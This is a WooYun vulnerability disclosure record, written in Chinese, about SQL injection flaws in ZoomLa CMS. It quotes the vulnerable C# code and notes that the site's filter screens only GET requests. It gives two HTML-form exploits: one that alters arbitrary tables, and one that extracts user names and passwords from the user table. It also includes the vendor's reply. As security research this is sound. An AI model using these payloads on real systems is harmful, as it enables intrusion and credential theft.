{"id": 47130, "wybug_id": "wooyun-2014-081875", "wybug_title": "逐浪CMS2个文件两个注入5处问题代码 另附其他注入绕过方式", "wybug_corp": "逐浪CMS", "wybug_author": "Damo", "wybug_date": "2014-11-06 10:23", "wybug_open_date": "2015-02-04 10:24", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧", "注射", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-09：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-04：\t细节向公众公开  简要描述： 厂商目前在安全方面已经下狠功夫了，虽然很多都参数化了以及数据类型的转换 但是难免会有遗漏，还望继续努力 详细说明：  注入点一 ：文件User/UserZone/StructView.aspx参数：ID后台代码片段：\npublic void Page_list()    {       .....        DataTable dataTable = this.user.Sel(\"StructureID like '%,\" + base.Request.QueryString[\"ID\"] + \",%'\", \"\");        .......    }\n此处可确定此ID参数是经过URL传值逐浪之前的防注入调整了那下面通过另一种方式绕过 那么看Global\nprivate void Application_BeginRequest(object sender, EventArgs e)        {            if (base.Request.RequestType.ToUpper() == \"GET\" && ZoomlaSecurityCenter.GetData())            {                function.WriteMessage(\"产生错误的可能原因：你提交的参数不正确,包含恶意字符串,或检查系统是否开启了SQL防注入功能!\", \"\", \"非法SQL注入或存储!\");            }            if (base.Request.HttpMethod.ToUpper() == \"POST\" && HttpContext.Current.Request.Files.Count > 0)            {                ZoomlaSecurityCenter.CheckUpladFiles();            }        ....}\n由此可得出结论 ：SQL注入的防御只对GET方式进行了过滤  而 POST  YY了那么 利用方式如下：\n<form action=\"http://192.168.10.55:9992/User/UserZone/StructView.aspx?ID=SA';update ZL_3DMusic set MusicName='wooyun' where id=1 and ',%'='\" method=\"post\"> <input id=\"Submit1\" type=\"submit\" value=\"submit\" /> </form>\n此处可修改任何表　这里测试的是表  ZL_3DMusic  的字段  MusicName 为wooyun\n\n注：此注入点在官网Dｅｍｏ中已被删除　，但是官方提供的下载中依然存在注入点二中则包含两个小侏儒：文件 ：/User/userzone/logmanage/logsearchresult.aspx代码片段： 问题出现在页面后台方法　这个方法中的　是小侏儒１　函数名称\nOK_Click()\n参数\nstring text2 = base.Request.Form[\"age1\"];        string text3 = base.Request.Form[\"age2\"];        string text4 = base.Request.Form[\"sex\"];        string text5 = base.Request.Form[\"ltype\"];\n \n问题代码１    text = text + \" and userSex=\" + text4;问题代码２        if (text5 != \"\")        {            text = text + \" and logtypeid='\" + text5 + \"'\";        }\n这个方法中的　是小侏儒２　函数名称\nOK2_Click（）\n参数：\nstring text2 = base.Request.Form[\"sType\"];string text3 = base.Request.Form[\"TypeStr\"];问题代码：问题代码１if (!string.IsNullOrEmpty(text3))                {                    text = text + \" and username='\" + text3.Trim() + \"'\";                }问题代码２if (!string.IsNullOrEmpty(text3))        {            text = text + \" and LogTitle='\" + text3.Trim() + \"'\";        }\n利用代码：如下\n<form action=\"http://demo.zoomla.cn/User/userzone/logmanage/logsearchresult.aspx\" method=\"post\"> <input type=\"text\" name=\"age1\" id=\"age1\" value=\"1\" /> <input type=\"text\" name=\"age2\" id=\"age2\" value=\"1\" /> <input type=\"text\" name=\"sex\" id=\"sex\" value=\"1\" /> <input type=\"text\" name=\"ltype\" id=\"ltype\" value=\"6F9619FF-8B86-D011-B42D-00C04FC964FF' and 1=( select top 1 STUFF( UserPwd, 1, 0, UserName) from dbo.ZL_User )--\" /> <input id=\"Submit1\" type=\"submit\" value=\"submit\" /> </form>\n\n\n   漏洞证明：  注入一\n\n注入二\n\n   修复方案：  过滤不到位另外过滤POST    版权声明：转载请注明来源 Damo@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-11-06 11:06 厂商回复： 感谢@Damo正解，其中有一些没用的模块，我们在新研发中已经剔除，而公开发布的开放版中，要等下一版更新发布，故有误差问题。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-06 11:35 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  给力。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}